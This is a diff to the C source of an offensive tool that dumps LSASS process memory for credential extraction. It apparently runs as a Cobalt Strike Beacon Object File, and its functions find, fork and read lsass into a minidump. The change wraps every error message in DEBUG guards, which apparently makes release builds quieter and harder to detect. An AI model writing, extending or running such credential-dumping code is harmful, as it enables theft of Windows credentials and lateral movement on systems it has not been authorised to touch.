@@ -27,6 +27,7 @@ void append(
 {
     if (dc->rva + size > DUMP_MAX_SIZE)
     {
+#ifdef DEBUG
 #ifdef BOF
         BeaconPrintf(CALLBACK_ERROR,
 #else
@@ -34,6 +35,7 @@ void append(
 #endif
             "The dump is too big, please increase DUMP_MAX_SIZE.\n"
         );
+#endif
     }
     else
     {
@@ -58,6 +60,7 @@ BOOL write_file(
     PUNICODE_STRING pUnicodeFilePath = intAlloc(sizeof(UNICODE_STRING));
     if (!pUnicodeFilePath)
     {
+#ifdef DEBUG
 #ifdef BOF
         BeaconPrintf(CALLBACK_ERROR,
 #else
@@ -67,6 +70,7 @@ BOOL write_file(
             (ULONG32)sizeof(UNICODE_STRING),
             GetLastError()
         );
+#endif
         return FALSE;
     }
 
@@ -116,6 +120,7 @@ BOOL write_file(
     }
     if (!NT_SUCCESS(status))
     {
+#ifdef DEBUG
 #ifdef BOF
         BeaconPrintf(CALLBACK_ERROR,
 #else
@@ -124,6 +129,7 @@ BOOL write_file(
             "Failed to call NtCreateFile, status: 0x%lx\n",
             status
         );
+#endif
         return FALSE;
     }
     // write the dump
@@ -141,6 +147,7 @@ BOOL write_file(
     NtClose(hFile); hFile = NULL;
     if (!NT_SUCCESS(status))
     {
+#ifdef DEBUG
 #ifdef BOF
         BeaconPrintf(CALLBACK_ERROR,
 #else
@@ -149,6 +156,7 @@ BOOL write_file(
             "Failed to call NtWriteFile, status: 0x%lx\n",
             status
         );
+#endif
         return FALSE;
     }
 
@@ -179,11 +187,13 @@ BOOL download_file(
     char* packedData = intAlloc(messageLength);
     if (!packedData)
     {
+#ifdef DEBUG
         BeaconPrintf(CALLBACK_ERROR,
             "Failed to call HeapAlloc for 0x%llx bytes, error: %ld\n",
             messageLength,
             GetLastError()
         );
+#endif
         return FALSE;
     }
 
@@ -218,11 +228,13 @@ BOOL download_file(
     char* packedChunk = intAlloc(chunkLength);
     if (!packedChunk)
     {
+#ifdef DEBUG
         BeaconPrintf(CALLBACK_ERROR,
             "Failed to call HeapAlloc for 0x%llx bytes, error: %ld\n",
             chunkLength,
             GetLastError()
         );
+#endif
         return FALSE;
     }
     // the fileId is the same for all chunks
@@ -280,6 +292,7 @@ BOOL enable_debug_priv(void)
     );
     if (!ok)
     {
+#ifdef DEBUG
 #ifdef BOF
         BeaconPrintf(CALLBACK_ERROR,
 #else
@@ -288,6 +301,7 @@ BOOL enable_debug_priv(void)
             "Failed to call LookupPrivilegeValueW, error: %ld\n",
             GetLastError()
         );
+#endif
         return FALSE;
     }
 
@@ -298,6 +312,7 @@ BOOL enable_debug_priv(void)
     );
     if(!NT_SUCCESS(status))
     {
+#ifdef DEBUG
 #ifdef BOF
         BeaconPrintf(CALLBACK_ERROR,
 #else
@@ -306,6 +321,7 @@ BOOL enable_debug_priv(void)
             "Failed to call NtOpenProcessToken, status: 0x%lx\n",
             status
         );
+#endif
         return FALSE;
     }
 
@@ -323,6 +339,7 @@ BOOL enable_debug_priv(void)
     NtClose(hToken);
     if (!NT_SUCCESS(status))
     {
+#ifdef DEBUG
 #ifdef BOF
         BeaconPrintf(CALLBACK_ERROR,
 #else
@@ -331,6 +348,7 @@ BOOL enable_debug_priv(void)
             "Failed to call NtAdjustPrivilegesToken, status: 0x%lx\n",
             status
         );
+#endif
         return FALSE;
     }
 
@@ -400,6 +418,7 @@ HANDLE get_process_handle(
     {
         if (!quiet)
         {
+#ifdef DEBUG
 #ifdef BOF
             BeaconPrintf(CALLBACK_ERROR,
 #else
@@ -408,6 +427,7 @@ HANDLE get_process_handle(
                 "Failed to call NtOpenProcess, status: 0x%lx\n",
                 status
             );
+#endif
         }
         return NULL;
     }
@@ -454,6 +474,7 @@ HANDLE fork_lsass_process(
 
     if (!NT_SUCCESS(status))
     {
+#ifdef DEBUG
 #ifdef BOF
         BeaconPrintf(CALLBACK_ERROR,
 #else
@@ -462,6 +483,7 @@ HANDLE fork_lsass_process(
             "Failed to call NtCreateProcess, status: 0x%lx\n",
             status
         );
+#endif
         return NULL;
     }
 
@@ -482,7 +504,7 @@ void write_header(
     header.CheckSum = 0;
     header.Reserved = 0;
     header.TimeDateStamp = 0;
-    header.Flags = 0; // MiniDumpNormal
+    header.Flags = MiniDumpNormal;
 
     char header_bytes[SIZE_OF_HEADER];
     int offset = 0;
@@ -656,6 +678,7 @@ PVOID get_peb_address(
     );
     if (!NT_SUCCESS(status))
     {
+#ifdef DEBUG
 #ifdef BOF
         BeaconPrintf(CALLBACK_ERROR,
 #else
@@ -664,6 +687,7 @@ PVOID get_peb_address(
             "Failed to call NtQueryInformationProcess, status: 0x%lx\n",
             status
         );
+#endif
         return 0;
     }
 
@@ -701,6 +725,7 @@ PVOID get_module_list_address(
     }
     if (!NT_SUCCESS(status))
     {
+#ifdef DEBUG
 #ifdef BOF
         BeaconPrintf(CALLBACK_ERROR,
 #else
@@ -709,6 +734,7 @@ PVOID get_module_list_address(
             "Failed to call NtReadVirtualMemory, status: 0x%lx\n",
             status
         );
+#endif
         return NULL;
     }
 
@@ -727,6 +753,7 @@ PVOID get_module_list_address(
     );
     if (!NT_SUCCESS(status))
     {
+#ifdef DEBUG
 #ifdef BOF
         BeaconPrintf(CALLBACK_ERROR,
 #else
@@ -735,6 +762,7 @@ PVOID get_module_list_address(
             "Failed to call NtReadVirtualMemory, status: 0x%lx\n",
             status
         );
+#endif
         return NULL;
     }
 
@@ -749,6 +777,7 @@ Pmodule_info add_new_module(
     Pmodule_info new_module = intAlloc(sizeof(module_info));
     if (!new_module)
     {
+#ifdef DEBUG
 #ifdef BOF
         BeaconPrintf(CALLBACK_ERROR,
 #else
@@ -756,7 +785,9 @@ Pmodule_info add_new_module(
 #endif
             "Failed to call HeapAlloc for 0x%x bytes, error: %ld\n",
             (ULONG32)sizeof(module_info),
-            GetLastError());
+            GetLastError()
+        );
+#endif
         return NULL;
     }
     new_module->next = NULL;
@@ -775,6 +806,7 @@ Pmodule_info add_new_module(
     );
     if (!NT_SUCCESS(status))
     {
+#ifdef DEBUG
 #ifdef BOF
         BeaconPrintf(CALLBACK_ERROR,
 #else
@@ -783,6 +815,7 @@ Pmodule_info add_new_module(
             "Failed to call NtReadVirtualMemory, status: 0x%lx\n",
             status
         );
+#endif
         return NULL;
     }
     return new_module;
@@ -805,6 +838,7 @@ BOOL read_ldr_entry(
     );
     if (!NT_SUCCESS(status))
     {
+#ifdef DEBUG
 #ifdef BOF
         BeaconPrintf(CALLBACK_ERROR,
 #else
@@ -813,6 +847,7 @@ BOOL read_ldr_entry(
             "Failed to call NtReadVirtualMemory, status: 0x%lx\n",
             status
         );
+#endif
         return FALSE;
     }
     // initialize base_dll_name with all null-bytes
@@ -827,6 +862,7 @@ BOOL read_ldr_entry(
     );
     if (!NT_SUCCESS(status))
     {
+#ifdef DEBUG
 #ifdef BOF
         BeaconPrintf(CALLBACK_ERROR,
 #else
@@ -835,6 +871,7 @@ BOOL read_ldr_entry(
             "Failed to call NtReadVirtualMemory, status: 0x%lx\n",
             status
         );
+#endif
         return FALSE;
     }
     return TRUE;
@@ -1137,6 +1174,7 @@ PMiniDumpMemoryDescriptor64 get_memory_ranges(
         new_range = intAlloc(sizeof(MiniDumpMemoryDescriptor64));
         if(!new_range)
         {
+#ifdef DEBUG
 #ifdef BOF
             BeaconPrintf(CALLBACK_ERROR,
 #else
@@ -1144,7 +1182,9 @@ PMiniDumpMemoryDescriptor64 get_memory_ranges(
 #endif
                 "Failed to call HeapAlloc for 0x%x bytes, error: %ld\n",
                 (ULONG32)sizeof(MiniDumpMemoryDescriptor64),
-                GetLastError());
+                GetLastError()
+            );
+#endif
             return NULL;
         }
         new_range->next = NULL;
@@ -1222,6 +1262,7 @@ PMiniDumpMemoryDescriptor64 write_memory64_list_stream(
         PBYTE buffer = intAlloc(curr_range->DataSize);
         if (!buffer)
         {
+#ifdef DEBUG
 #ifdef BOF
             BeaconPrintf(CALLBACK_ERROR,
 #else
@@ -1231,6 +1272,7 @@ PMiniDumpMemoryDescriptor64 write_memory64_list_stream(
                 curr_range->DataSize,
                 GetLastError()
             );
+#endif
             return NULL;
         }
         NTSTATUS status = NtReadVirtualMemory(
@@ -1243,6 +1285,7 @@ PMiniDumpMemoryDescriptor64 write_memory64_list_stream(
         // once in a while, a range fails with STATUS_PARTIAL_COPY, not relevant for mimikatz
         if (!NT_SUCCESS(status) && status != STATUS_PARTIAL_COPY)
         {
+#ifdef DEBUG
 #ifdef BOF
             BeaconPrintf(CALLBACK_ERROR,
 #else
@@ -1256,6 +1299,7 @@ PMiniDumpMemoryDescriptor64 write_memory64_list_stream(
                 curr_range->Type,
                 status
             );
+#endif
             //return NULL;
         }
         append(dc, buffer, curr_range->DataSize);
@@ -1343,6 +1387,7 @@ HANDLE find_lsass(void)
         }
         if (!NT_SUCCESS(status))
         {
+#ifdef DEBUG
 #ifdef BOF
             BeaconPrintf(CALLBACK_ERROR,
 #else
@@ -1351,6 +1396,7 @@ HANDLE find_lsass(void)
                 "Failed to call NtGetNextProcess, status: 0x%lx\n",
                 status
             );
+#endif
             return NULL;
         }
         if (is_lsass(hProcess))
@@ -1371,6 +1417,7 @@ PVOID allocate_memory(PSIZE_T RegionSize)
     );
     if (!NT_SUCCESS(status))
     {
+#ifdef DEBUG
 #ifdef BOF
         BeaconPrintf(CALLBACK_ERROR,
 #else
@@ -1378,6 +1425,7 @@ PVOID allocate_memory(PSIZE_T RegionSize)
 #endif
             "Could not allocate enough memory to write the dump\n"
         );
+#endif
         return NULL;
     }
     return BaseAddress;
@@ -1396,6 +1444,7 @@ void erase_dump_from_memory(PVOID BaseAddress, SIZE_T RegionSize)
     );
     if (!NT_SUCCESS(status))
     {
+#ifdef DEBUG
 #ifdef BOF
         BeaconPrintf(CALLBACK_ERROR,
 #else
@@ -1404,6 +1453,7 @@ void erase_dump_from_memory(PVOID BaseAddress, SIZE_T RegionSize)
             "Failed to call NtFreeVirtualMemory, status: 0x%lx\n",
             status
         );
+#endif
     }
 }
 
@@ -1447,6 +1497,7 @@ BOOL is_process_handle(
     POBJECT_TYPE_INFORMATION ObjectInformation = intAlloc(buffer_size);
     if (!ObjectInformation)
     {
+#ifdef DEBUG
 #ifdef BOF
         BeaconPrintf(CALLBACK_ERROR,
 #else
@@ -1456,6 +1507,7 @@ BOOL is_process_handle(
             buffer_size,
             GetLastError()
         );
+#endif
         return FALSE;
     }
 
@@ -1468,6 +1520,7 @@ BOOL is_process_handle(
     );
     if (!NT_SUCCESS(status))
     {
+#ifdef DEBUG
 #ifdef BOF
         BeaconPrintf(CALLBACK_ERROR,
 #else
@@ -1476,6 +1529,7 @@ BOOL is_process_handle(
             "Failed to call NtQueryObject, status: 0x%lx\n",
             status
         );
+#endif
         return FALSE;
     }
     if (!_wcsicmp(ObjectInformation->TypeName.Buffer, L"Process"))
@@ -1491,6 +1545,7 @@ PSYSTEM_HANDLE_INFORMATION get_all_handles(void)
     PVOID handleTableInformation = intAlloc(buffer_size);
     if (!handleTableInformation)
     {
+#ifdef DEBUG
 #ifdef BOF
         BeaconPrintf(CALLBACK_ERROR,
 #else
@@ -1500,6 +1555,7 @@ PSYSTEM_HANDLE_INFORMATION get_all_handles(void)
             buffer_size,
             GetLastError()
         );
+#endif
         return NULL;
     }
     while (TRUE)
@@ -1518,6 +1574,7 @@ PSYSTEM_HANDLE_INFORMATION get_all_handles(void)
             handleTableInformation = intAlloc(buffer_size);
             if (!handleTableInformation)
             {
+#ifdef DEBUG
 #ifdef BOF
                 BeaconPrintf(CALLBACK_ERROR,
 #else
@@ -1527,6 +1584,7 @@ PSYSTEM_HANDLE_INFORMATION get_all_handles(void)
                     buffer_size,
                     GetLastError()
                 );
+#endif
                 return NULL;
             }
             continue;
@@ -1534,6 +1592,7 @@ PSYSTEM_HANDLE_INFORMATION get_all_handles(void)
         if (!NT_SUCCESS(status))
         {
             intFree(handleTableInformation); handleTableInformation = NULL;
+#ifdef DEBUG
 #ifdef BOF
             BeaconPrintf(CALLBACK_ERROR,
 #else
@@ -1542,6 +1601,7 @@ PSYSTEM_HANDLE_INFORMATION get_all_handles(void)
                 "Failed to call NtQuerySystemInformation, status: 0x%lx\n",
                 status
             );
+#endif
             return NULL;
         }
         return handleTableInformation;
@@ -1568,6 +1628,7 @@ PPROCESS_LIST get_processes_from_handle_table(
     PPROCESS_LIST process_list = intAlloc(sizeof(PROCESS_LIST));
     if (!process_list)
     {
+#ifdef DEBUG
 #ifdef BOF
         BeaconPrintf(CALLBACK_ERROR,
 #else
@@ -1577,6 +1638,7 @@ PPROCESS_LIST get_processes_from_handle_table(
             (ULONG32)sizeof(PROCESS_LIST),
             GetLastError()
         );
+#endif
         return NULL;
     }
 
@@ -1589,6 +1651,7 @@ PPROCESS_LIST get_processes_from_handle_table(
             process_list->ProcessId[process_list->Count++] = handleInfo->ProcessId;
             if (process_list->Count == MAX_PROCESSES)
             {
+#ifdef DEBUG
 #ifdef BOF
                 BeaconPrintf(CALLBACK_ERROR,
 #else
@@ -1596,6 +1659,7 @@ PPROCESS_LIST get_processes_from_handle_table(
 #endif
                     "Too many processes, please increase MAX_PROCESSES\n"
                 );
+#endif
                 break;
             }
         }
